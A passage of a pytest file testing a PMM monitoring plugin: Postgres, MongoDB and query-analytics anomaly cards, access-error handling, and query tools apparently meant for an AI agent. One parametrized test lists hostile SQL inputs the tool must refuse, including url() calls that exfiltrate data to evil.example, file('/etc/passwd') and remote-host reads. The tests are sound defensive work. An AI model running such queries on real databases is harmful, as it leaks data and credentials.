    labelled = {x['key'] for x in checks.evaluate_mongo(mongo_data('rs9'), checks.MONGO_RULE)[0]}
    plain = {x['key'] for x in checks.evaluate_mongo(mongo_data(), checks.MONGO_RULE)[0]}

    # then
    assert 'mongo|rs0|election' in named and 'mongo|rs9|election' in labelled and 'mongo|replica-set|election' in plain
    assert 'in replica set rs9' in next(x for x in checks.evaluate_mongo(mongo_data('rs9'), checks.MONGO_RULE)[0] if x['key'] == f'mongo|{M3}|state')['what']


def test_standalone_servers_and_routers_get_no_replica_set_cards():
    # given
    standalone = mongo_layout({'mongo-solo': (None, None)})
    sharded = mongo_layout({'shard-a-1': (1, 'shard-a'), 'shard-a-2': (2, 'shard-a'), 'cfg-1': (1, 'cfg'), 'router-1': (None, None)})
    headless = mongo_layout({'shard-a-2': (2, 'shard-a'), 'router-1': (None, None)})

    # when
    alone, alone_rows = checks.evaluate_mongo(standalone, checks.MONGO_RULE)
    named, _ = checks.evaluate_mongo(standalone, checks.MONGO_RULE, replica_set='rs0')
    shards, shard_rows = checks.evaluate_mongo(sharded, checks.MONGO_RULE)
    lost, _ = checks.evaluate_mongo(headless, checks.MONGO_RULE)

    # then
    assert alone == [] and named == [] and [r['set'] for r in alone_rows] == ['']
    assert shards == [] and {r['svc']: r['set'] for r in shard_rows} == {'cfg-1': 'cfg', 'router-1': '', 'shard-a-1': 'shard-a', 'shard-a-2': 'shard-a'}
    assert [(x['key'], x['sev']) for x in lost] == [('mongo|shard-a|no-primary', 'crit')]


def test_qan_rules_flag_load_slow_stall_calls_and_server_total():
    # when
    found, top = checks.evaluate_qan(qan_data(), checks.QAN_RULE)

    # then
    by = {x['key']: x for x in found}
    assert by[f'qan|{PRIMARY}|load|q1']['sev'] == 'crit' and by[f'qan|{PRIMARY}|stall|q1']['sev'] == 'warn'
    assert by[f'qan|{R1}|slow|q2']['sev'] == 'warn' and by[f'qan|{PRIMARY}|calls|q3']['sev'] == 'info'
    assert by[f'qan|{R1}|load|q4']['sev'] == 'warn'
    assert by[f'qan|{PRIMARY}|total']['sev'] == 'warn' and f'qan|{R1}|total' not in by
    assert by[f'qan|{PRIMARY}|load|q1']['svc'] == 'checkout-service'
    assert f'{clock.hm(NOW - 1200)} {clock.label(NOW - 1200)}' in by[f'qan|{PRIMARY}|stall|q1']['what']
    assert [x['queryid'] for x in top] == ['q1', 'q4', 'q2', 'q3']


def test_qan_without_rows_has_no_data():
    # when
    got = checks.evaluate_qan(([], []), checks.QAN_RULE)

    # then
    assert got is None


def test_a_healthy_server_without_lock_series_is_ok_and_stores_zero(store: Store):
    # given
    http = FakeHttp(pmm_routes(metrics=metric_answer(locks=False)))

    # when
    with app_with(store, http, main={}) as c:
        sweep(c, 'pmm')
        state = store.load()
    cards = cards_of(store)

    # then
    assert state['sources']['pmm'] == 'ok' and 'no lock series' not in state['serverPasses']['pmm']['status']
    assert {(r['lockMax'], r['lockMins'], r['lockMaxD1'], r['lockMaxD7'], r['lockMinsD1'], r['lockMinsD7']) for r in state['pmm']} == {(0, 0, 0, 0, 0, 0)}
    assert not [k for k in cards if k.endswith('|lock-waits')]


def test_the_lock_rule_still_fires_when_sessions_wait():
    # given
    data = pmm_data()

    # when
    found, rows = checks.evaluate_pmm(data, checks.PMM_RULE)

    # then
    assert f'pmm|{PRIMARY}|lock-waits' in {x['key'] for x in found}
    assert next(r for r in rows if r['svc'] == R1)['lockMax'] == 0


def test_patterns_outside_re2_are_refused_by_the_test_and_the_passes(store: Store):
    # given
    http = FakeHttp(pmm_routes())
    odd = {'postgres-services': '(?!test-).*', 'mongo-services': '(a)\\1'}

    # when
    tested = connection_of(pmm_runtime(store, http, main=odd))
    with app_with(store, http, main=odd) as c:
        sweep(c)
        state = store.load()

    # then
    assert (tested.ok, tested.summary) == (False, 'Postgres services uses a lookaround or a backreference, which PMM cannot run')
    assert state['sources']['pmm'] == state['sources']['qan'] == 'error: Postgres services uses a lookaround or a backreference, which PMM cannot run'
    assert state['sources']['mongo'] == 'error: MongoDB services uses a lookaround or a backreference, which PMM cannot run'
    assert not http.hits(metrics_path()) and not http.hits(qan_path())


def test_the_per_query_statement_is_capped_and_a_full_answer_is_named(store: Store):
    # given
    names = ['service_name', 'database', 'queryid', 'q', 'c0', 't0', 'c1', 't1', 'c2', 't2', 'pk0', 'pkat0', 'pkc0']
    many = [[PRIMARY] * 1000, ['shop'] * 1000, [f'q{i}' for i in range(1000)], ['SELECT 1'] * 1000] + [[1.0] * 1000 for _ in names[4:]]
    totals = qan_answer()

    def answer(params, body):
        if 'queryid' in body['queries'][0]['rawSql']:
            return {'results': {'A': {'frames': [{'schema': {'fields': [{'name': n} for n in names]}, 'data': {'values': many}}]}}}
        return totals(params, body)

    http = FakeHttp(pmm_routes(qan=answer))

    # when
    with app_with(store, http, main={}) as c:
        sweep(c, 'qan')
        state = store.load()

    # then
    sql = [c[3]['queries'][0]['rawSql'] for c in http.hits(qan_path())]
    assert [s.endswith('ORDER BY greatest(t0, t1, t2) DESC LIMIT 1000') for s in sql if 'queryid' in s] == [True]
    assert state['sources']['qan'] == 'ok \u00b7 read 1000 queries, more not read' and len(state['qan']) == 12


def test_links_cover_pmm_qan_and_mongo_only():
    # given
    pg = {x['key']: x for x in checks.evaluate_pmm(pmm_data(), checks.PMM_RULE)[0]}
    q = {x['key']: x for x in checks.evaluate_qan(qan_data(), checks.QAN_RULE)[0]}
    mg = {x['key']: x for x in checks.evaluate_mongo(mongo_data(), checks.MONGO_RULE, replica_set='rs0')[0]}
    info = pmm.InstanceInfo('main', True, None, {'url': URL})

    # then
    assert [link['label'] for link in pmm.links(pg[f'pmm|{R3}|repl-lag'], info)] == ['PMM instance summary', 'PMM replication overview']
    assert pmm.links(pg[f'pmm|{R3}|repl-lag'], info)[0]['url'].startswith(f'{URL}/graph/d/postgresql-instance-summary/')
    assert 'filter_by=q2' in pmm.links(q[f'qan|{R1}|slow|q2'], info)[0]['url']
    assert pmm.links(mg['mongo|rs0|election'], info)[0]['label'] == 'PMM replica set summary'
    assert pmm.links(mg[f'mongo|{M3}|state'], info)[0]['label'] == 'PMM MongoDB instance summary'
    assert pmm.links({'src': 'prom', 'sig': 'err'}, info) is None
    assert pmm.links(pg[f'pmm|{R3}|repl-lag'], pmm.InstanceInfo('main', True, None, {'url': 'http://pmm.internal'})) is None


def test_the_probe_target_is_the_ready_endpoint():
    # given
    info = pmm.InstanceInfo('east', False, 'east', {'url': EAST_URL + '/'})

    # when
    targets = pmm.probe_targets(info)

    # then
    assert targets == [{'name': 'pmm-east', 'url': f'{EAST_URL}/v1/readyz'}]


def test_one_failing_pass_does_not_stop_the_other_two(store: Store):
    # given
    http = FakeHttp(pmm_routes(qan=HttpError(502, qan_path())))

    # when
    with app_with(store, http, main={}) as c:
        sweep(c)
        state = store.load()

    # then
    assert state['sources']['qan'] == 'error: PMM QAN query HTTP 502'
    assert state['sources']['pmm'] == 'ok' and len(state['pmm']) == len(PG)
    assert state['sources']['mongo'] == 'ok' and len(state['mongo']) == len(MG)


def test_the_app_runs_the_three_passes_with_a_token_and_records_them(store: Store):
    # given
    store.save_state({'anomalies': [], 'initialized': True, 'sources': {'prom': 'ok'}}, None)
    http = FakeHttp(pmm_routes())

    # when
    with app_with(store, http, main={}) as c:
        jobs = {j.name: j for j in c.app.state.scheduler.jobs}
        info = c.get('/api/server').json()
        page = c.get('/').text
        script = c.get('/plugins/pmm/panel.js')
        sweep(c)
    state = store.load()

    # then
    assert {(jobs[f'pmm.{k}'].period, jobs[f'pmm.{k}'].offset) for k in ('pmm', 'qan', 'mongo')} == {(900, 360)}
    assert [p['id'] for p in info['plugins']] == ['pmm']
    assert [p['tab'] for p in info['plugins'][0]['pages']] == ['pg', 'mongo']
    assert '/plugins/pmm/panel.js' in page and script.status_code == 200 and "'skopax:page'" in script.text
    assert state['sources'] == {'prom': 'ok', 'pmm': 'ok', 'qan': 'ok', 'mongo': 'ok'}
    assert {k: v['status'] for k, v in state['serverPasses'].items()} == {'pmm': 'ok', 'qan': 'ok', 'mongo': 'ok'}
    assert len(state['pmm']) == len(PG) and len(state['mongo']) == len(MG) and state['qan'] == []
    assert all(r['link'].startswith(f'{URL}/graph/d/') for r in state['pmm'] + state['mongo'])


def test_without_an_instance_no_pmm_job_is_registered(store: Store):
    # when
    with TestClient(create_app(settings(), store)) as c:
        names = [j.name for j in c.app.state.scheduler.jobs]
        info = c.get('/api/server').json()

    # then
    assert not [n for n in names if n.startswith('pmm.')] and info['plugins'] == []


def test_pmm_query_runs_instant_or_range_and_caps_the_window_and_points(store: Store):
    # given
    def answer(params, body):
        if 'start' in params:
            return {'status': 'success', 'data': {'resultType': 'matrix', 'result': [{'metric': {'service_name': 'p'}, 'values': [[i, '1'] for i in range(900)]}]}}
        return vector(params, [({'service_name': 'p'}, 1.0)])

    http = FakeHttp(pmm_routes(metrics=answer))
    b = tool_box(store, http)

    # when
    itext, ierr = b.call('pmm_query', {'expr': 'pg_up'})
    rtext, rerr = b.call('pmm_query', {'expr': 'pg_up', 'range_minutes': 60, 'at': NOW - 600})
    b.call('pmm_query', {'expr': 'pg_up', 'range_minutes': 1440})
    over = b.call('pmm_query', {'expr': 'pg_up', 'range_minutes': 99999})

    # then
    assert (ierr, rerr) == (False, False)
    assert over == ('range_minutes must be at most 1440, got 99999', True)
    assert '"value": 1.0' in itext and rtext.count('"1"') == 500
    assert asked(http) == [('instant', 'pg_up', NOW), ('range', 'pg_up', NOW - 4200, NOW - 600, 60), ('range', 'pg_up', NOW - 86400, NOW, 432)]
    schema = next(t for t in pmm.PLUGIN.tools if t.name == 'pmm_query').input_schema
    assert schema['properties']['range_minutes'] == {'type': 'integer', 'minimum': 1, 'maximum': 1440}


@pytest.mark.parametrize('sql', [
    "SELECT * FROM url('http://evil.example/x', CSV, 'a String')",
    "WITH (SELECT example FROM pmm.metrics LIMIT 1) AS e SELECT * FROM url(concat('http://evil.example/?d=', e), CSV, 'a String')",
    "SELECT * FROM remote('10.0.0.5', system.users)",
    "SELECT query FROM system.query_log",
    'SELECT * FROM `system`.`users`',
    'SELECT * FROM "system"."users"',
    "SELECT * FROM url/**/('http://evil.example/x')",
    "SELECT * FROM s3Cluster('c', 'http://evil.example/x')",
    "SELECT * FROM merge('system', '.*')",
    "SELECT * FROM pmm.metrics JOIN postgresql('h:5432', 'db', 't', 'u', 'p') AS p ON 1",
    "SELECT * FROM pmm.metrics, url('http://evil.example/x')",
    "SELECT * FROM pmm.metrics, icebergS3('http://evil.example/x')",
    "SELECT file('/etc/passwd')",
    "SELECT 1 SETTINGS readonly = 0",
    "SELECT 1 INTO OUTFILE '/tmp/x'",
    "SELECT 1 -- comment",
    "SELECT 1 # comment",
])
def test_qan_refuses_table_functions_system_tables_settings_and_comments(store: Store, sql):
    # given
    http = FakeHttp(pmm_routes())
    b = tool_box(store, http)

    # when
    out, err = b.call('qan', {'sql': sql, 'hours': 1})

    # then
    assert err and 'pmm.metrics' in out
    assert http.hits(qan_path()) == []


def test_qan_takes_an_ordinary_query_on_pmm_metrics(store: Store):
    # given
    http = FakeHttp(pmm_routes(qan={'results': {'A': {'frames': [{'schema': {'fields': [{'name': 'n'}]}, 'data': {'values': [[1]]}}]}}}))
    b = tool_box(store, http)
    sql = ("SELECT queryid, sum(num_queries) AS n, formatReadableSize(sum(m_rows_sent_sum)) AS rows FROM pmm.metrics WHERE service_name IN ('a', 'b') "
           "AND period_start > now() - INTERVAL 1 HOUR GROUP BY queryid ORDER BY n DESC LIMIT 10")

    # when
    out, err = b.call('qan', {'sql': sql, 'hours': 1})

    # then
    assert not err, out
    assert [c[3]['queries'][0]['rawSql'] for c in http.hits(qan_path())] == [sql]


@pytest.mark.parametrize('args,message', [
    ({'sql': 'SELECT 1', 'hours': 0.1}, 'hours must be at least 0.25, got 0.1'),
    ({'sql': 'SELECT 1', 'hours': '24'}, 'hours must be a number, got a string'),
    ({'sql': 'SELECT 1', 'hours': 99999}, 'hours must be at most 168, got 99999'),
], ids=['qan-hours-low', 'qan-hours-string', 'qan-hours-high'])
def test_an_input_that_breaks_the_qan_schema_is_refused_with_the_field_and_what_was_expected(store: Store, args, message):
    # given
    http = FakeHttp(pmm_routes())
    b = tool_box(store, http)

    # when
    out, err = b.call('qan', args)

    # then
    assert (out, err) == (message, True)
    assert http.hits(qan_path()) == []


def test_a_bad_qan_call_and_a_source_error_come_back_as_recorded_tool_errors(store: Store):
    # given
    http = FakeHttp(pmm_routes(metrics={'status': 'error', 'error': f'parse error near {TOKEN}'}))
    b = tool_box(store, http)

    # when
    bad_sql = b.call('qan', {'sql': 'DELETE FROM pmm.metrics', 'hours': 1})
    failed = b.call('pmm_query', {'expr': 'pg_up('})

    # then
    assert bad_sql[1] and 'SELECT' in bad_sql[0]
    assert failed[1] and failed[0].startswith('PMM metrics query answered an error') and 'parse error near ***' in failed[0] and TOKEN not in failed[0]
    assert [c['error'] is not None for c in b.calls] == [True, True]


def test_tool_descriptions_state_the_contract_the_code_enforces():
    # given
    desc = {t.name: t.description for t in pmm.PLUGIN.tools}

    # then
    assert 'There is no range query' not in desc['pmm_query'] and 'range_minutes (1-1440)' in desc['pmm_query'] and 'about 200 points' in desc['pmm_query']
    assert 'pmm.metrics only' in desc['qan'] and 'no table functions, system tables, SETTINGS or comments' in desc['qan']


QUERY_ROLE = 'the Viewer role (query on the {} data source)'
LIST_RIGHT = 'the Admin role (or datasources:read) to list data sources'


def test_a_refused_metrics_read_keeps_the_cards_and_raises_an_access_card(store: Store):
    # given
    http = FakeHttp(pmm_routes(metrics=metric_answer(conn=800)))
    saturation = f'pmm|{PRIMARY}|saturation'

    # when
    with app_with(store, http, main={}) as c:
        sweep(c, 'pmm', 'mongo')
        http.routes.update(pmm_routes(metrics=HttpError(403, metrics_path())))
        sweep(c, 'pmm', 'mongo', now=NOW + 900)
        refused, during = store.load(), cards_of(store)
        http.routes.update(pmm_routes(metrics=metric_answer(conn=800)))
        sweep(c, 'pmm', 'mongo', now=NOW + 1800)
    after = cards_of(store)

    # then
    assert refused['sources']['pmm'] == refused['sources']['mongo'] == 'ok \u00b7 no access to metrics'
    assert during[saturation]['status'] == 'open'
    card = during['no-access|-/pmm|metrics']
    assert (card['status'], card['sev'], card['ranKey'], card['src']) == ('open', 'warn', 'pmm:access:metrics', 'pmm')
    assert card['label'] == 'PMM cannot read metrics: the token lacks ' + QUERY_ROLE.format('metrics') and card['short'] == 'WARN ' + card['label']
    assert during['no-access|-/mongo|metrics']['ranKey'] == 'mongo:access:metrics'
    assert after['no-access|-/pmm|metrics']['status'] == after['no-access|-/mongo|metrics']['status'] == 'cleared' and after[saturation]['status'] == 'open'


def test_a_refused_data_source_list_raises_its_own_access_card(store: Store):
    # given
    listing = f'{URL}/graph/api/datasources'
    http = FakeHttp(pmm_routes() | {('GET', listing): HttpError(403, listing)})

    # when
    with app_with(store, http, main={}) as c:
        sweep(c, 'pmm', 'qan')
        state = store.load()
    cards = cards_of(store)

    # then
    assert state['sources']['pmm'] == state['sources']['qan'] == 'ok \u00b7 no access to data sources'
    assert cards['no-access|-/pmm|data-sources']['label'] == 'PMM cannot read data sources: the token lacks ' + LIST_RIGHT
    assert cards['no-access|-/qan|data-sources']['ranKey'] == 'qan:access:data-sources'


def test_a_refusal_in_the_answer_body_is_a_refusal(store: Store):
    # given
    denied_sql = {'results': {'A': {'error': 'Code: 497. DB::Exception: pmm-reader: Not enough privileges. To execute this query, it is necessary to have the grant SELECT'}}}
    http = FakeHttp(pmm_routes(metrics={'status': 'error', 'errorType': 'forbidden', 'error': 'forbidden: user may not query this source'}, qan=denied_sql))

    # when
    with app_with(store, http, main={}) as c:
        sweep(c)
        state = store.load()
    cards = cards_of(store)

    # then
    assert state['sources']['pmm'] == state['sources']['mongo'] == 'ok \u00b7 no access to metrics'
    assert state['sources']['qan'] == 'ok \u00b7 no access to QAN'
    assert cards['no-access|-/qan|qan']['label'] == 'PMM cannot read QAN: the token lacks ' + QUERY_ROLE.format('QAN')


def test_pmm_connection_test_names_a_missing_permission(store: Store):
    # given
    listing = f'{URL}/graph/api/datasources'
    no_list = FakeHttp(pmm_routes() | {('GET', listing): HttpError(403, listing)})
    no_metrics = FakeHttp(pmm_routes(metrics=HttpError(403, metrics_path(uid='other'))))
    no_qan = FakeHttp(pmm_routes(qan={'results': {'A': {'error': 'Not enough privileges'}}}))
    expired = FakeHttp(pmm_routes(version=HttpError(401, f'{URL}/v1/version')))
    unversioned = HttpError(404, f'{URL}/v1/version')
    revoked_list = FakeHttp(pmm_routes(version=unversioned) | {('GET', listing): HttpError(401, listing)})
    revoked_probe = FakeHttp(pmm_routes(version=unversioned, metrics=HttpError(401, metrics_path(uid='other'))))

    # when
    listed = connection_of(pmm_runtime(store, no_list))
    metrics = connection_of(pmm_runtime(store, no_metrics, main={'metrics-datasource': 'other', 'qan-datasource': QAN_UID}))
    qan_found = connection_of(pmm_runtime(store, no_qan))
    rejected = connection_of(pmm_runtime(store, expired))
    list_401 = connection_of(pmm_runtime(store, revoked_list))
    probe_401 = connection_of(pmm_runtime(store, revoked_probe, main={'metrics-datasource': 'other', 'qan-datasource': QAN_UID}))

    # then
    assert (listed.ok, listed.summary) == (False, 'PMM cannot read data sources: the token lacks ' + LIST_RIGHT)
    assert (metrics.ok, metrics.summary) == (False, 'PMM cannot read metrics: the token lacks ' + QUERY_ROLE.format('metrics'))
    assert (qan_found.ok, qan_found.summary) == (False, 'PMM cannot read QAN: the token lacks ' + QUERY_ROLE.format('QAN'))
    assert (rejected.ok, rejected.summary) == (False, msg('connection.rejected', status=401))
    assert (list_401.ok, list_401.summary) == (False, msg('connection.rejected', status=401))
    assert (probe_401.ok, probe_401.summary) == (False, msg('connection.rejected', status=401))


def test_a_refused_tool_call_names_the_permission(store: Store):
    # given
    http = FakeHttp(pmm_routes(metrics=HttpError(403, metrics_path()), qan=HttpError(403, qan_path())))
    b = tool_box(store, http)

    # when
    metrics = b.call('pmm_query', {'expr': 'pg_up'})
    qan_sql = b.call('qan', {'sql': 'SELECT 1', 'hours': 1})

    # then
    assert metrics == ('PMM metrics query HTTP 403; the token lacks ' + QUERY_ROLE.format('metrics'), True)
    assert qan_sql == ('PMM QAN query HTTP 403; the token lacks ' + QUERY_ROLE.format('QAN'), True)


def test_a_pmm_error_is_a_read_error_with_its_http_code():
    # given
    listing = f'{URL}/graph/api/datasources'
    client = Pmm(URL, TOKEN, FakeHttp(pmm_routes() | {('GET', listing): HttpError(403, listing)}))

    # when
    with pytest.raises(PmmError):
        client.uid('metrics')
    with pytest.raises(PmmError) as again:
        client.uid('metrics')

    # then
    assert isinstance(again.value, ReadError) and again.value.status == again.value.code == 403 and again.value.denied
    assert connection.failure(again.value) == 'PMM data source list HTTP 403' and 'PmmError' not in connection.failure(again.value)


def test_two_pmm_instances_that_see_one_server_keep_their_own_cards(store: Store):
    # given
    busy = metric_answer(pg=EAST_PG, mongo=EAST_MG, conn=800)
    http = FakeHttp(pmm_routes(metrics=busy) | pmm_routes(EAST_URL, metrics=busy))
    key = 'pmm|pg-east-1|saturation'

    # when
    with app_with(store, http, main={}, east={'url': EAST_URL}) as c:
        sweep(c, 'pmm')
        both = {k: (a.get('cluster'), a.get('ranKey'), a['status']) for k, a in cards_of(store).items() if k.startswith(key)}
        http.routes.update(pmm_routes(EAST_URL, metrics=metric_answer(pg=EAST_PG, mongo=EAST_MG, conn=50)))
        sweep(c, 'pmm', now=NOW + 900)
        east_calm = {k: a['status'] for k, a in cards_of(store).items() if k.startswith(key)}

    # then
    assert both == {key: (None, None, 'open'), key + '@east': ('east', 'pmm-east', 'open')}
    assert east_calm == {key: 'open', key + '@east': 'cleared'}


def test_an_access_card_of_a_second_instance_is_its_own(store: Store):
    # given
    http = FakeHttp(pmm_routes(metrics=metric_answer(conn=800)) | pmm_routes(EAST_URL, metrics=HttpError(403, metrics_path(EAST_URL))))

    # when
    with app_with(store, http, main={}, east={'url': EAST_URL}) as c:
        sweep(c, 'pmm')
        state = store.load()
    access = {k: (a.get('cluster'), a['ranKey']) for k, a in cards_of(store).items() if k.startswith('no-access|')}

    # then
    assert access == {'no-access|-/pmm|metrics@east': ('east', 'pmm:access:metrics-east')}
    assert (state['sources']['pmm'], state['sources']['pmm-east']) == ('ok', 'ok \u00b7 no access to metrics')


def test_pmm_lists_an_access_key_only_for_a_part_it_read_refused_or_skipped(store: Store):
    # given
    listing = f'{URL}/graph/api/datasources'
    refused = pmm_runtime(store, FakeHttp(pmm_routes() | {('GET', listing): HttpError(403, listing)}))
    pinned = pmm_runtime(store, FakeHttp(pmm_routes()), main={'metrics-datasource': METRICS_UID})

    def run(runtime):
        ctx = runtime.context(pmm.PLUGIN, runtime.instances.get('pmm', 'main'), NOW)
        ctx.rules = lambda set_id: dict(checks.PMM_RULE)
        return pmm.run_pmm(ctx).result

    # when
    blind, skipped = run(refused), run(pinned)

    # then
    assert blind.ran == ('pmm:access:data-sources',), 'a pass that never reached the metrics must not clear the metrics access card (P5-C128)'
    assert set(skipped.ran) == {'pmm', 'pmm:access:data-sources', 'pmm:access:metrics'}, 'a pinned data source skips the listing, so its access card closes (P5-C128a)'


def test_a_401_from_pmm_names_the_token_as_invalid_or_lacking(store: Store):
    # given
    runtime = pmm_runtime(store, FakeHttp(pmm_routes(metrics=HttpError(401, metrics_path()))))
    runtime.live = SimpleNamespace(rules_of=lambda key: {})

    # when
    out = pmm.run_pmm(runtime.context(pmm.PLUGIN, runtime.instances.get('pmm', 'main'), NOW)).result

    # then
    [card] = out.found
    assert card['label'] == 'PMM cannot read metrics: the token is invalid or lacks ' + QUERY_ROLE.format('metrics')
    assert (card['key'], card['sig'], card['ranKey']) == ('no-access|-/pmm|metrics', 'no-access', 'pmm:access:metrics')


def test_a_capped_qan_read_holds_the_cards_of_queries_it_did_not_read(store: Store):
    # given
    names = ['service_name', 'database', 'queryid', 'q', 'c0', 't0', 'c1', 't1', 'c2', 't2', 'pk0', 'pkat0', 'pkc0']
    many = [[PRIMARY] * 1000, ['shop'] * 1000, [f'q{i}' for i in range(1000)], ['SELECT 1'] * 1000] + [[1.0] * 1000 for _ in names[4:]]
    full = qan_answer()

    def capped(params, body):
        if 'queryid' in body['queries'][0]['rawSql']:
            return {'results': {'A': {'frames': [{'schema': {'fields': [{'name': n} for n in names]}, 'data': {'values': many}}]}}}
        return full(params, body)

    http = FakeHttp(pmm_routes(qan=capped))
    unread = {'key': f'qan|{PRIMARY}|calls|q-unread', 'src': 'qan', 'sig': 'qan-calls', 'ns': 'postgres', 'svc': 'shop', 'sub': PRIMARY, 'sev': 'info', 'status': 'open', 'now': 1,
              'label': 'query calls', 'what': 'x', 'short': 'INFO x', 'ranKey': f'qan:{PRIMARY}:q-unread', 'firstSeen': '2026-10-17T07:00:00Z', 'lastSeen': '2026-10-17T07:45:00Z'}
    read = dict(unread, key=f'qan|{PRIMARY}|calls|q7', ranKey=f'qan:{PRIMARY}:q7')
    store.save_state({'anomalies': [unread, read], 'initialized': True}, None)

    # when
    with app_with(store, http, main={}) as c:
        sweep(c, 'qan')
    cards = cards_of(store)

    # then
    assert cards[unread['key']]['status'] == 'open', 'a query past the cap was not read, so its card is held'
    assert cards[read['key']]['status'] == 'cleared'


def test_qan_cards_carry_a_per_query_key_and_a_full_read_closes_a_query_that_went_quiet(store: Store):
    # given
    http = FakeHttp(pmm_routes())
    quiet = {'key': f'qan|{PRIMARY}|load|q-gone', 'src': 'qan', 'sig': 'qan-load', 'ns': 'postgres', 'svc': 'shop', 'sub': PRIMARY, 'sev': 'warn', 'status': 'open', 'now': 1,
             'label': 'query DB time (s)', 'what': 'x', 'short': 'WARN x', 'ranKey': f'qan:{PRIMARY}:q-gone', 'firstSeen': '2026-10-17T07:00:00Z', 'lastSeen': '2026-10-17T07:45:00Z'}
    old = dict(quiet, key=f'qan|{PRIMARY}|load|q-old', ranKey=None)
    store.save_state({'anomalies': [quiet, old], 'initialized': True}, None)

    # when
    found = checks.evaluate_qan(qan_data(), dict(checks.QAN_RULE))[0]
    with app_with(store, http, main={}) as c:
        sweep(c, 'qan')
    cards = cards_of(store)

    # then
    assert {x['ranKey'] for x in found if x.get('queryid')} <= {f'qan:{PRIMARY}:q1', f'qan:{R1}:q2', f'qan:{PRIMARY}:q3', f'qan:{R1}:q4'}
    assert {x['ranKey'] for x in found if x['sig'] == 'qan-total'} == {'qan:totals'}
    assert cards[quiet['key']]['status'] == 'cleared' and cards[old['key']]['status'] == 'cleared'


def test_the_pmm_test_skips_the_parts_only_switched_off_checks_read(store: Store):
    # given
    refusing = FakeHttp(pmm_routes(qan=HttpError(403, qan_path()), metrics=HttpError(403, metrics_path())))

    def tested(off: set[str]):
        runtime = pmm_runtime(store, refusing)
        ctx = runtime.context(pmm.PLUGIN, runtime.instances.get('pmm', 'main'), NOW)
        ctx.instance = dataclasses.replace(ctx.instance, off_checks=frozenset(off))
        return pmm.test(ctx)

    # when
    all_on, no_qan, only_qan, none_on = tested(set()), tested({'qan'}), tested({'pmm', 'mongo'}), tested({'pmm', 'qan', 'mongo'})

    # then
    assert not all_on.ok and 'metrics' in all_on.summary
    assert (no_qan.ok, no_qan.summary) == (False, 'PMM cannot read metrics: the token lacks ' + QUERY_ROLE.format('metrics'))
    assert (only_qan.ok, only_qan.summary) == (False, 'PMM cannot read QAN: the token lacks ' + QUERY_ROLE.format('QAN'))
    assert none_on.ok


def test_the_pmm_test_keeps_every_call_inside_its_own_budget(store: Store):
    # given
    seen = []
    http = FakeHttp(pmm_routes())

    def timed(method, url, headers, data, timeout):
        seen.append(timeout)
        return http(method, url, headers, data, timeout)

    runtime = pmm_runtime(store, timed)

    # when
    tested = connection_of(runtime)

    # then
    assert tested.ok and seen and max(seen) <= pmm.TEST_BUDGET_S < 15
